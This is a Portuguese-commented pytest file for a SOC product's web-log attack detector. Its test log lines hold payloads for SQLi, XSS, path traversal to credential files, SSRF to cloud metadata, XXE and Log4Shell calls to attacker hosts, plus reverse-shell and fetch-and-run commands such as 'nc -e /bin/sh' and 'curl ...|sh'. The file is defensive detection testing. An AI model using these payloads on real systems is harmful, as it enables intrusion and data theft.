# SENTINELA-COPYRIGHT-INICIO
# Copyright (c) 2026 Vinicius Martins. Todos os direitos reservados.
# Sentinela SOC -- software proprietário; uso, cópia e distribuição somente sob licença.
# Ver o arquivo LICENSE na raiz do projeto.
# SENTINELA-COPYRIGHT-FIM
"""
Testes do motor de detecção (sentinela.core.analisador_logs).

Cobrem: parsing de CLF/Combined Log Format, cada categoria de ataque
(inclusive com evasão simples por URL-encoding), contagem de linhas não
reconhecidas, agregação do relatório e a filtragem pura por limite de
ataques (`candidatos_por_limite`).

Os testes de orquestração completa (reputação + risco + criação de
incidente + bloqueio) migraram para
`tests/integration/test_resposta_incidentes.py`, já que essa lógica agora
vive em `sentinela.services.resposta_incidentes` e depende de Postgres
(tenant-scoped) — não é mais pura o bastante para um teste unitário puro.
"""
from sentinela.core import analisador_logs


# ---------------------------------------------------------------------------
# analisar_linha_log
# ---------------------------------------------------------------------------

def test_linha_benigna_nao_gera_alerta():
    linha = '192.168.1.50 - - [26/Aug/2026:10:00:00] "GET /index.html HTTP/1.1" 200 1024\n'
    assert analisador_logs.analisar_linha_log(linha) is None


def test_linha_fora_do_formato_e_marcada_como_nao_reconhecida():
    resultado = analisador_logs.analisar_linha_log("isso nao e uma linha de log valida\n")
    assert resultado == {"nao_reconhecida": True}


def test_ip_com_zone_id_ipv6_e_marcado_como_nao_reconhecido():
    """`\\S+` do PADRAO_LOG bate com a notação de zone-id do IPv6
    ("fe80::1%eth0" não tem espaço), e `ipaddress.ip_address()` sozinho
    aceitaria esse valor -- mas o Postgres `inet` não entende essa sintaxe,
    e um candidato assim travava o lote inteiro de resposta a incidentes
    (ver util.ip_valido). A linha precisa ser descartada aqui, na borda."""
    linha = '2606:4700:4700::1111%eth0 - - [26/Aug/2026:10:00:00] "GET /?x=1\' UNION SELECT null,pass FROM users-- - HTTP/1.1" 200 100\n'
    resultado = analisador_logs.analisar_linha_log(linha)
    assert resultado == {"nao_reconhecida": True}


def test_sqli_com_evasao_por_url_encoding_e_detectado():
    linha = (
        '203.0.113.5 - - [26/Aug/2026:10:01:00] '
        '"GET /vulneravel.php?id=1\'%20UNION%20SELECT%20null,pass%20FROM%20users HTTP/1.1" 200 4500\n'
    )
    resultado = analisador_logs.analisar_linha_log(linha)
    assert resultado is not None
    assert resultado["tipo_ataque"] == "SQL Injection (SQLi)"
    assert resultado["ip"] == "203.0.113.5"


def test_path_traversal_com_evasao_por_url_encoding_e_detectado():
    linha = '203.0.113.5 - - [26/Aug/2026:10:01:05] "GET /admin?cmd=..%2f..%2fetc%2fpasswd HTTP/1.1" 200 500\n'
    resultado = analisador_logs.analisar_linha_log(linha)
    assert resultado["tipo_ataque"] == "Path Traversal"


def test_xss_e_detectado():
    linha = '203.0.113.5 - - [26/Aug/2026:10:01:15] "GET /?x=<script>alert(1)</script> HTTP/1.1" 200 300\n'
    resultado = analisador_logs.analisar_linha_log(linha)
    assert resultado["tipo_ataque"] == "Cross-Site Scripting (XSS)"


def test_command_injection_e_detectado():
    """
    Correção de bug encontrado em revisão crítica (2026-09, achado 2): este
    payload bate tanto no padrão de "Command Injection" (`;cat`) quanto no
    de "Path Traversal" (`/etc/`) -- antes da correção, o primeiro padrão
    que batesse na ordem de iteração do dict PADROES_ATAQUE "ganhava"
    (Path Traversal vem antes de Command Injection), classificando um
    ataque de injeção de comando real como Path Traversal. Isso importa de
    verdade: SEVERIDADE_PESO pesa Command Injection em 30 contra 20 de
    Path Traversal (core/risk_engine.py), e o score errado podia derrubar
    o risco calculado abaixo do limiar que aciona incidente/bloqueio
    automático (services/resposta_incidentes.py). Agora a classificação
    escolhe sempre a de MAIOR severidade entre os padrões que baterem --
    a asserção abaixo é estrita (não mais um "in (...)") justamente para
    pegar uma regressão desta classificação específica.
    """
    linha = '203.0.113.5 - - [26/Aug/2026:10:01:20] "GET /?cmd=;cat%20/etc/shadow HTTP/1.1" 200 300\n'
    resultado = analisador_logs.analisar_linha_log(linha)
    assert resultado["tipo_ataque"] == "Command Injection"


def test_command_injection_com_caminho_sensivel_nao_e_mascarado_como_path_traversal():
    """Repro direto do achado 2 -- variação com /etc/passwd (o exemplo
    citado na revisão) em vez de /etc/shadow, e sem URL-encoding."""
    linha = '203.0.113.6 - - [26/Aug/2026:10:01:21] "GET /vuln?x=;cat /etc/passwd HTTP/1.1" 200 300\n'
    resultado = analisador_logs.analisar_linha_log(linha)
    assert resultado["tipo_ataque"] == "Command Injection"


def test_path_traversal_puro_sem_operador_de_comando_continua_path_traversal():
    """Garante que a correção do achado 2 não classifica TUDO que toca um
    caminho sensível como Command Injection -- só quando o padrão de
    Command Injection também bate de verdade (separador + binário/backtick/
    $(...)). Um path traversal puro, sem `;`/`|`/backtick, continua Path
    Traversal."""
    linha = '203.0.113.7 - - [26/Aug/2026:10:01:22] "GET /admin?cmd=../../etc/passwd HTTP/1.1" 200 300\n'
    resultado = analisador_logs.analisar_linha_log(linha)
    assert resultado["tipo_ataque"] == "Path Traversal"


def test_scanner_detectado_apenas_pelo_user_agent():
    linha = '203.0.113.5 - - [26/Aug/2026:10:01:10] "GET / HTTP/1.1" 404 200 "-" "sqlmap/1.6"\n'
    resultado = analisador_logs.analisar_linha_log(linha)
    assert resultado["tipo_ataque"] == "Scanner de Vulnerabilidades (User-Agent)"


def test_combined_log_format_com_referrer_e_user_agent_e_parseado():
    linha = '203.0.113.5 - - [26/Aug/2026:10:01:10] "GET /x HTTP/1.1" 200 100 "https://ref.com" "nikto/2.5"\n'
    resultado = analisador_logs.analisar_linha_log(linha)
    assert resultado is not None
    assert resultado["ip"] == "203.0.113.5"


# ---------------------------------------------------------------------------
# Regressão: evasões encontradas no pentest interno (ver pentest_adversarial.py)
# -- cada caso aqui já passava despercebido antes da correção das assinaturas.
# ---------------------------------------------------------------------------

def _linha_com(payload, ip="203.0.113.77"):
    return f'{ip} - - [01/Sep/2026:12:00:00 -0300] "GET /app?q={payload} HTTP/1.1" 200 100 "-" "Mozilla/5.0"'


def test_sqli_blind_booleano_com_and_e_detectado():
    linha = _linha_com("1' AND SUBSTRING(username,1,1)='a")
    resultado = analisador_logs.analisar_linha_log(linha)
    assert resultado is not None and resultado["tipo_ataque"] == "SQL Injection (SQLi)"


def test_sqli_time_based_pg_sleep_e_detectado():
    linha = _linha_com("1'; select pg_sleep(5)#")
    resultado = analisador_logs.analisar_linha_log(linha)
    assert resultado is not None and resultado["tipo_ataque"] == "SQL Injection (SQLi)"


def test_sqli_stacked_query_xp_cmdshell_e_detectado():
    linha = _linha_com("1'; EXEC xp_cmdshell('whoami')#")
    resultado = analisador_logs.analisar_linha_log(linha)
    assert resultado is not None and resultado["tipo_ataque"] == "SQL Injection (SQLi)"


def test_sqli_bypass_por_triplo_url_encoding_e_detectado():
    """_normalizar() decodificava só 2 camadas -- um payload codificado 3x
    (%2525... precisa de 3 unquote() para virar '%') escapava de toda a
    detecção. Agora decodifica em loop até estabilizar."""
    payload = "1'%252520UNION%252520SELECT%252520null,pass%252520FROM%252520users"
    linha = _linha_com(payload)
    resultado = analisador_logs.analisar_linha_log(linha)
    assert resultado is not None and resultado["tipo_ataque"] == "SQL Injection (SQLi)"


def test_xss_via_manipuladores_de_evento_fora_da_lista_fixa_e_detectado():
    for payload in [
        "<img src=x onclick=alert(1)>",
        "<details open ontoggle=alert(document.domain)>",
        "<div onpointerdown=alert(1)>x</div>",
    ]:
        resultado = analisador_logs.analisar_linha_log(_linha_com(payload))
        assert resultado is not None and resultado["tipo_ataque"] == "Cross-Site Scripting (XSS)", payload


def test_xss_generico_nao_gera_falso_positivo_quando_on_nao_esta_numa_borda_de_palavra():
    """O padrão genérico \\bon\\w+\\s*= não deve disparar em parâmetros comuns
    em que 'on' aparece no MEIO de outra palavra (sem borda de palavra antes
    dele) -- ex.: "salonEvent" e "wagon" têm 'on' precedido de letra, não de
    espaço/aspas/&/=. (Um parâmetro que comece literalmente com "on", como
    "onward=5", É reconhecido como possível handler de evento -- esse é o
    trade-off aceito de trocar uma lista fechada por um padrão genérico.)"""
    for payload in ["salonEvent=1", "wagon=1", "reason=abc", "million=5"]:
        resultado = analisador_logs.analisar_linha_log(_linha_com(payload))
        assert resultado is None, payload


def test_path_traversal_absoluto_sem_dois_pontos_e_detectado():
    for payload in ["/etc/shadow", "/proc/self/cmdline", "/root/.ssh/id_rsa", "/var/log/auth.log"]:
        resultado = analisador_logs.analisar_linha_log(_linha_com(payload))
        assert resultado is not None and resultado["tipo_ataque"] == "Path Traversal", payload


def test_command_injection_pipe_para_binario_fora_do_grupo_reduzido_e_detectado():
    for payload in [
        "1|nc -e /bin/sh 10.0.0.1 4444",
        "1|curl http://10.0.0.1/x.sh|sh",
        "1|bash -i",
    ]:
        resultado = analisador_logs.analisar_linha_log(_linha_com(payload))
        assert resultado is not None and resultado["tipo_ataque"] == "Command Injection", payload


def test_command_injection_binario_fora_da_lista_original_e_detectado():
    resultado = analisador_logs.analisar_linha_log(_linha_com(";rm -rf /tmp/x"))
    assert resultado is not None and resultado["tipo_ataque"] == "Command Injection"


def test_command_injection_via_separador_newline_e_detectado():
    linha = _linha_com("1%0awhoami")
    resultado = analisador_logs.analisar_linha_log(linha)
    assert resultado is not None and resultado["tipo_ataque"] == "Command Injection"


def test_scanner_com_biblioteca_http_generica_no_user_agent_e_detectado():
    linha = (
        '203.0.113.77 - - [01/Sep/2026:12:00:00 -0300] "GET / HTTP/1.1" 200 100 '
        '"-" "Go-http-client/1.1 meu-scanner-customizado/3.0"'
    )
    resultado = analisador_logs.analisar_linha_log(linha)
    assert resultado is not None
    assert resultado["tipo_ataque"] == "Scanner de Vulnerabilidades (User-Agent)"


def _linha_com_user_agent(user_agent, ip="203.0.113.80"):
    return (
        f'{ip} - - [01/Sep/2026:12:00:00 -0300] "GET / HTTP/1.1" 200 100 "-" "{user_agent}"'
    )


def test_scanner_nunca_visto_antes_e_detectado_pela_heuristica_de_fallback():
    """
    Nenhuma lista de nomes de ferramenta cobre uma ferramenta nunca vista
    antes. A heurística de fallback (User-Agent sem token de navegador e sem
    bater com um bot/monitoramento legítimo conhecido) precisa pegar mesmo
    um nome totalmente inventado, que não está em nenhuma lista.
    """
    for ua in ["MeuScannerTotalmenteNovo/1.0 (nunca visto antes)", "CustomInternalTool-v3"]:
        resultado = analisador_logs.analisar_linha_log(_linha_com_user_agent(ua))
        assert resultado is not None, ua
        assert resultado["tipo_ataque"] == "Scanner de Vulnerabilidades (User-Agent)", ua


def test_navegadores_reais_nao_geram_falso_positivo():
    navegadores = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/128.0",
    ]
    for ua in navegadores:
        resultado = analisador_logs.analisar_linha_log(_linha_com_user_agent(ua))
        assert resultado is None, ua


def test_bots_e_monitoramento_legitimos_conhecidos_nao_geram_falso_positivo():
    """A heurística de fallback dá um passe livre para bots/crawlers e
    ferramentas de monitoramento amplamente conhecidas, mesmo sem 'cara de
    navegador' -- senão qualquer health check ou webhook viraria alerta."""
    clientes_legitimos = [
        "Googlebot/2.1 (+http://www.google.com/bot.html)",
        "kube-probe/1.29",
        "ELB-HealthChecker/2.0",
        "Pingdom.com_bot_version_1.4",
    ]
    for ua in clientes_legitimos:
        resultado = analisador_logs.analisar_linha_log(_linha_com_user_agent(ua))
        assert resultado is None, ua


def test_linha_sem_user_agent_nao_aplica_a_heuristica_de_fallback():
    """Common Log Format (sem grupo de user_agent) não deve virar alerta só
    por não ter User-Agent nenhum -- a heurística exige um UA presente."""
    linha = '192.168.1.50 - - [26/Aug/2026:10:00:00] "GET /index.html HTTP/1.1" 200 1024'
    assert analisador_logs.analisar_linha_log(linha) is None


# ---------------------------------------------------------------------------
# processar_arquivo_logs
# ---------------------------------------------------------------------------

def test_processar_arquivo_logs_agrega_corretamente(arquivo_log_exemplo):
    relatorio = analisador_logs.processar_arquivo_logs(arquivo_log_exemplo)

    assert relatorio["linhas_totais"] == 8
    assert relatorio["linhas_nao_reconhecidas"] == 1
    # 5 alertas para 203.0.113.5 + 1 para 198.51.100.12
    assert relatorio["total_alertas"] == 6
    assert relatorio["contagem_completa_ips"]["203.0.113.5"] == 5
    assert relatorio["contagem_completa_ips"]["198.51.100.12"] == 1
    assert relatorio["ips_mais_perigosos"][0] == ("203.0.113.5", 5)


def test_processar_arquivo_sem_ataques_gera_relatorio_vazio(tmp_path):
    caminho = tmp_path / "limpo.log"
    caminho.write_text('192.168.1.1 - - [26/Aug/2026:10:00:00] "GET / HTTP/1.1" 200 100\n', encoding="utf-8")
    relatorio = analisador_logs.processar_arquivo_logs(str(caminho))
    assert relatorio["total_alertas"] == 0
    assert relatorio["ips_mais_perigosos"] == []


# ---------------------------------------------------------------------------
# candidatos_por_limite (função pura que substitui a 1ª metade do antigo
# responder_a_incidentes — a orquestração completa agora é testada em
# tests/integration/test_resposta_incidentes.py)
# ---------------------------------------------------------------------------

def test_candidatos_por_limite_ignora_ip_no_limite_exato(arquivo_log_exemplo):
    """Um IP com exatamente `limite_ataques` ataques NÃO deve virar candidato (regra é > limite, não >=)."""
    relatorio = analisador_logs.processar_arquivo_logs(arquivo_log_exemplo)
    candidatos = analisador_logs.candidatos_por_limite(relatorio, limite_ataques=5)
    assert candidatos == []


def test_candidatos_por_limite_inclui_ip_acima_do_limite(arquivo_log_exemplo):
    relatorio = analisador_logs.processar_arquivo_logs(arquivo_log_exemplo)
    candidatos = analisador_logs.candidatos_por_limite(relatorio, limite_ataques=4)

    assert len(candidatos) == 1
    assert candidatos[0]["ip"] == "203.0.113.5"
    assert candidatos[0]["total_ataques"] == 5
    assert "SQL Injection (SQLi)" in candidatos[0]["tipos_ataque"]


def test_candidatos_por_limite_ordena_do_mais_ativo_para_o_menos_ativo(tmp_path):
    linhas = [
        '203.0.113.1 - - [01/Sep/2026:12:00:00] "GET /?x=<script>a</script> HTTP/1.1" 200 100\n',
        '203.0.113.2 - - [01/Sep/2026:12:00:01] "GET /?x=<script>a</script> HTTP/1.1" 200 100\n',
        '203.0.113.2 - - [01/Sep/2026:12:00:02] "GET /?x=<script>b</script> HTTP/1.1" 200 100\n',
    ]
    caminho = tmp_path / "log.txt"
    caminho.write_text("".join(linhas), encoding="utf-8")
    relatorio = analisador_logs.processar_arquivo_logs(str(caminho))
    candidatos = analisador_logs.candidatos_por_limite(relatorio, limite_ataques=0)
    assert [c["ip"] for c in candidatos] == ["203.0.113.2", "203.0.113.1"]


# ---------------------------------------------------------------------------
# Correção de regressão pós-auditoria (GAP_REPORT_V3.1.md, Fase 18): estas
# 9 assinaturas e a detecção volumétrica (Força Bruta em Login, DDoS/Flood)
# existiam em sentinela_soc_saas_2_3/analisador_logs.py e nunca tinham sido
# portadas para este módulo. Testes espelhados de
# sentinela_soc_saas_2_3/tests/test_analisador_logs.py (mesmos payloads).
# ---------------------------------------------------------------------------

def test_ssrf_para_endpoint_de_metadados_de_nuvem_e_detectado():
    linha = _linha_com("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
    resultado = analisador_logs.analisar_linha_log(linha)
    assert resultado is not None and resultado["tipo_ataque"] == "Server-Side Request Forgery (SSRF)"


def test_ssrf_para_rede_interna_e_detectado():
    for payload in ["http://127.0.0.1/admin", "http://10.0.0.5/", "http://192.168.1.1/", "http://172.16.0.1/"]:
        resultado = analisador_logs.analisar_linha_log(_linha_com(payload))
        assert resultado is not None and resultado["tipo_ataque"] == "Server-Side Request Forgery (SSRF)", payload


def test_xxe_com_doctype_entity_e_detectado():
    linha = _linha_com('<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.example.com/evil.dtd">]>')
    resultado = analisador_logs.analisar_linha_log(linha)
    assert resultado is not None and resultado["tipo_ataque"] == "XML External Entity (XXE)"


def test_ssti_com_expressao_matematica_e_detectado():
    for payload in ["{{7*7}}", "${7*7}", "{%if 1%}x{%endif%}"]:
        resultado = analisador_logs.analisar_linha_log(_linha_com(payload))
        assert resultado is not None and resultado["tipo_ataque"] == "Server-Side Template Injection (SSTI)", payload


def test_ssti_com_objeto_interno_do_jinja_e_detectado():
    resultado = analisador_logs.analisar_linha_log(_linha_com("{{config.items()}}"))
    assert resultado is not None and resultado["tipo_ataque"] == "Server-Side Template Injection (SSTI)"


def test_ldap_injection_e_detectado():
    resultado = analisador_logs.analisar_linha_log(_linha_com("*)(uid=*))(|(uid=*"))
    assert resultado is not None and resultado["tipo_ataque"] == "LDAP Injection"


def test_nosql_injection_e_detectado():
    for payload in ["username[$ne]=1&password[$ne]=1", "filtro=$where:1"]:
        resultado = analisador_logs.analisar_linha_log(_linha_com(payload))
        assert resultado is not None and resultado["tipo_ataque"] == "NoSQL Injection", payload


def test_log4shell_jndi_e_detectado():
    linha = _linha_com("${jndi:ldap://attacker.com/a}")
    resultado = analisador_logs.analisar_linha_log(linha)
    assert resultado is not None and resultado["tipo_ataque"] == "Log4Shell / JNDI Injection"


def test_deserializacao_insegura_java_e_detectado():
    resultado = analisador_logs.analisar_linha_log(_linha_com("rO0ABXNyABdqYXZh"))
    assert resultado is not None and resultado["tipo_ataque"] == "Deserialização Insegura"


def test_deserializacao_insegura_php_e_detectado():
    resultado = analisador_logs.analisar_linha_log(_linha_com('O:8:"stdClass":1:{s:1:"x";s:1:"y";}'))
    assert resultado is not None and resultado["tipo_ataque"] == "Deserialização Insegura"


def test_crlf_injection_e_detectado():
    linha = _linha_com("x%0d%0aSet-Cookie:%20sessao=admin")
    resultado = analisador_logs.analisar_linha_log(linha)
    assert resultado is not None and resultado["tipo_ataque"] == "CRLF Injection / HTTP Response Splitting"


def test_open_redirect_e_detectado():
    linha = '203.0.113.77 - - [01/Sep/2026:12:00:00 -0300] "GET /login?redirect=http://evil.example.com HTTP/1.1" 200 100 "-" "Mozilla/5.0"'
    resultado = analisador_logs.analisar_linha_log(linha)
    assert resultado is not None and resultado["tipo_ataque"] == "Open Redirect"


def test_severidade_peso_e_mapa_mitre_cobrem_todas_as_categorias_novas():
    """Trava de sincronização: cada chave nova de PADROES_ATAQUE precisa ter
    entrada correspondente em SEVERIDADE_PESO (core/risk_engine.py) e em
    MAPA_MITRE (core/mitre.py) -- ver comentário no topo de PADROES_ATAQUE.
    Pega de imediato um novo tipo_ataque esquecido em algum dos dois, em vez
    de só degradar silenciosamente para o peso/mapeamento padrão (8 / N-A)."""
    from sentinela.core.mitre import MAPA_MITRE
    from sentinela.core.risk_engine import SEVERIDADE_PESO

    novas_assinaturas = {
        "Server-Side Request Forgery (SSRF)",
        "XML External Entity (XXE)",
        "Server-Side Template Injection (SSTI)",
        "LDAP Injection",
        "NoSQL Injection",
        "Log4Shell / JNDI Injection",
        "Deserialização Insegura",
        "CRLF Injection / HTTP Response Splitting",
        "Open Redirect",
    }
    novos_volumetricos = {"Força Bruta em Login (Brute Force)", "Possível DDoS / Flood de Requisições"}
    novas_categorias = novas_assinaturas | novos_volumetricos

    # As 9 assinaturas vivem em PADROES_ATAQUE (casadas por regex); os 2
    # detectores volumétricos são sintéticos (gerados por
    # RastreadorVolumetrico, não por regex) e por isso NUNCA aparecem lá --
    # ambos os grupos, ainda assim, precisam de peso e mapeamento MITRE.
    assert novas_assinaturas <= set(analisador_logs.PADROES_ATAQUE)
    assert not (novos_volumetricos & set(analisador_logs.PADROES_ATAQUE))
    assert novas_categorias <= set(SEVERIDADE_PESO)
    assert novas_categorias <= set(MAPA_MITRE)
    for categoria in novas_categorias:
        assert MAPA_MITRE[categoria]["id"] != "N/A", categoria


# ---------------------------------------------------------------------------
# Expansão de cobertura: detecção por VOLUME (Força Bruta em Login e
# DDoS/Flood) -- ataques que só ficam visíveis pela repetição, não por uma
# única requisição com payload malicioso.
# ---------------------------------------------------------------------------

def _linha_login_falha(ip, n, status="401"):
    return f'{ip} - - [02/Sep/2026:11:00:{n:02d} +0000] "POST /login HTTP/1.1" {status} 50 "-" "Mozilla/5.0"\n'


def _linha_normal(ip, n):
    return f'{ip} - - [02/Sep/2026:11:00:{n:02d} +0000] "GET /painel HTTP/1.1" 200 500 "-" "Mozilla/5.0"\n'


def test_forca_bruta_login_e_detectada_ao_cruzar_o_limite(tmp_path):
    caminho = tmp_path / "login.log"
    caminho.write_text("".join(_linha_login_falha("203.0.113.20", i) for i in range(5)), encoding="utf-8")
    relatorio = analisador_logs.processar_arquivo_logs(
        str(caminho), limite_tentativas_login=5, limite_requisicoes_ddos=1000
    )
    alertas_fb = [a for a in relatorio["detalhes_alertas"] if a["tipo_ataque"] == "Força Bruta em Login (Brute Force)"]
    # dispara exatamente uma vez ao cruzar o limite, não uma vez por tentativa
    assert len(alertas_fb) == 1
    assert alertas_fb[0]["ip"] == "203.0.113.20"


def test_forca_bruta_login_nao_dispara_abaixo_do_limite(tmp_path):
    caminho = tmp_path / "login.log"
    caminho.write_text("".join(_linha_login_falha("203.0.113.21", i) for i in range(4)), encoding="utf-8")
    relatorio = analisador_logs.processar_arquivo_logs(
        str(caminho), limite_tentativas_login=5, limite_requisicoes_ddos=1000
    )
    tipos = {a["tipo_ataque"] for a in relatorio["detalhes_alertas"]}
    assert "Força Bruta em Login (Brute Force)" not in tipos


def test_forca_bruta_login_com_status_de_sucesso_nao_conta_como_falha(tmp_path):
    """Login bem-sucedido (200) repetido não deve virar força bruta -- só
    tentativas com status de falha de autenticação (401/403) contam."""
    caminho = tmp_path / "login.log"
    caminho.write_text(
        "".join(_linha_login_falha("203.0.113.22", i, status="200") for i in range(10)), encoding="utf-8"
    )
    relatorio = analisador_logs.processar_arquivo_logs(
        str(caminho), limite_tentativas_login=5, limite_requisicoes_ddos=1000
    )
    tipos = {a["tipo_ataque"] for a in relatorio["detalhes_alertas"]}
    assert "Força Bruta em Login (Brute Force)" not in tipos


def test_ddos_flood_e_detectado_ao_cruzar_o_limite(tmp_path):
    caminho = tmp_path / "flood.log"
    caminho.write_text("".join(_linha_normal("203.0.113.30", i) for i in range(10)), encoding="utf-8")
    relatorio = analisador_logs.processar_arquivo_logs(
        str(caminho), limite_requisicoes_ddos=10, limite_tentativas_login=1000
    )
    alertas_ddos = [
        a for a in relatorio["detalhes_alertas"] if a["tipo_ataque"] == "Possível DDoS / Flood de Requisições"
    ]
    assert len(alertas_ddos) == 1
    assert alertas_ddos[0]["ip"] == "203.0.113.30"


def test_ddos_flood_nao_dispara_abaixo_do_limite(tmp_path):
    caminho = tmp_path / "flood.log"
    caminho.write_text("".join(_linha_normal("203.0.113.31", i) for i in range(9)), encoding="utf-8")
    relatorio = analisador_logs.processar_arquivo_logs(
        str(caminho), limite_requisicoes_ddos=10, limite_tentativas_login=1000
    )
    tipos = {a["tipo_ataque"] for a in relatorio["detalhes_alertas"]}
    assert "Possível DDoS / Flood de Requisições" not in tipos


def test_rastreador_volumetrico_dispara_uma_unica_vez_por_ip():
    """Mesmo que o IP continue mandando requisições depois de cruzar o
    limite, o alerta sintético de volume não deve se repetir a cada uma."""
    rastreador = analisador_logs.RastreadorVolumetrico(limite_requisicoes_ddos=3, limite_tentativas_login=1000)
    alertas = []
    for _ in range(6):
        alertas.extend(rastreador.registrar("203.0.113.40", "data", "/x", "200"))
    assert len(alertas) == 1
    assert alertas[0]["tipo_ataque"] == "Possível DDoS / Flood de Requisições"


def test_ddos_flood_com_ip_invalido_e_ignorado(tmp_path):
    """Diferença deliberada em relação à V3 (defesa em profundidade já
    aplicada a analisar_linha_log, ver util.ip_valido): um IP com zone-id
    IPv6 não deve virar candidato a incidente/bloqueio nem pela via
    volumétrica -- Postgres `inet` rejeitaria o INSERT."""
    caminho = tmp_path / "flood_ip_invalido.log"
    linhas = [
        f'2606:4700:4700::1111%eth0 - - [02/Sep/2026:11:00:{i:02d} +0000] "GET /painel HTTP/1.1" 200 500 "-" "Mozilla/5.0"\n'
        for i in range(10)
    ]
    caminho.write_text("".join(linhas), encoding="utf-8")
    relatorio = analisador_logs.processar_arquivo_logs(
        str(caminho), limite_requisicoes_ddos=10, limite_tentativas_login=1000
    )
    assert relatorio["total_alertas"] == 0
    assert relatorio["linhas_nao_reconhecidas"] == 10


def test_candidatos_por_limite_inclui_ip_sinalizado_por_forca_bruta(tmp_path):
    """Integração ponta a ponta com a função pura que services/resposta_incidentes.py
    já usa -- confirma que o alerta sintético de volume é tratado exatamente
    como qualquer outro alerta de PADROES_ATAQUE, sem precisar mudar nada em
    candidatos_por_limite nem em resposta_incidentes.py."""
    caminho = tmp_path / "login_candidato.log"
    caminho.write_text("".join(_linha_login_falha("203.0.113.23", i) for i in range(5)), encoding="utf-8")
    relatorio = analisador_logs.processar_arquivo_logs(
        str(caminho), limite_tentativas_login=5, limite_requisicoes_ddos=1000
    )
    candidatos = analisador_logs.candidatos_por_limite(relatorio, limite_ataques=0)
    assert len(candidatos) == 1
    assert candidatos[0]["ip"] == "203.0.113.23"
    assert candidatos[0]["tipos_ataque"] == ["Força Bruta em Login (Brute Force)"]


def test_correlacao_detecta_cadeia_scanner_e_exploracao():
    from sentinela.core.correlacao import correlacionar_por_ip
    relatorio = {"detalhes_alertas": [
        {"ip": "203.0.113.10", "data": "03/Sep/2026:10:00:01", "tipo_ataque": "Scanner de Vulnerabilidades"},
        {"ip": "203.0.113.10", "data": "03/Sep/2026:10:00:05", "tipo_ataque": "Path Traversal"},
        {"ip": "203.0.113.10", "data": "03/Sep/2026:10:00:09", "tipo_ataque": "SQL Injection (SQLi)"},
    ]}
    corr = correlacionar_por_ip(relatorio)["203.0.113.10"]
    assert corr["correlacionado"] is True
    # Nome do sinal atual em core/correlacao.py (renomeado de
    # "scanner_seguido_de_exploracao" -- este teste estava desatualizado).
    assert "reconhecimento_e_exploracao" in corr["sinais"]
